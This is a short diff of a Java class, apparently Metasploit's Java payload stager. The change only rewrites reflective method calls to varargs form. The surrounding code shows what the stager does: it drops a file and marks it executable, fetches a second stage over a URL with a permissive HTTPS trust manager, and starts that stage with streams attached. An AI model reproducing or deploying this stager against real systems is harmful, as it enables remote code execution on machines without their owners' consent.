@@ -151,7 +151,7 @@ public class Payload extends ClassLoader {
             if (!IS_DOS) {
                 try {
                     try {
-                        File.class.getMethod("setExecutable", new Class[]{boolean.class}).invoke(droppedFile, new Object[]{Boolean.TRUE});
+                        File.class.getMethod("setExecutable", new Class[]{boolean.class}).invoke(droppedFile, Boolean.TRUE);
                     } catch (NoSuchMethodException ex) {
                         // ok, no setExecutable method, call chmod and wait for it
                         Runtime.getRuntime().exec(new String[]{"chmod", "+x", droppedExecutable}).waitFor();
@@ -192,7 +192,7 @@ public class Payload extends ClassLoader {
                     // load the trust manager via reflection, to avoid loading
                     // it when it is not needed (it requires Sun Java 1.4+)
                     if (url.startsWith("https:")) {
-                        Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
+                        Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, uc);
                     }
                     addRequestHeaders(uc, props);
                     in = uc.getInputStream();
@@ -277,7 +277,7 @@ public class Payload extends ClassLoader {
                 clazz = Class.forName("javapayload.stage." + embeddedStageName);
             }
             final Object stage = clazz.newInstance();
-            clazz.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, new Object[]{in, out, stageParameters});
+            clazz.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, in, out, stageParameters);
         } catch (final Throwable t) {
             t.printStackTrace(new PrintStream(out));
         }
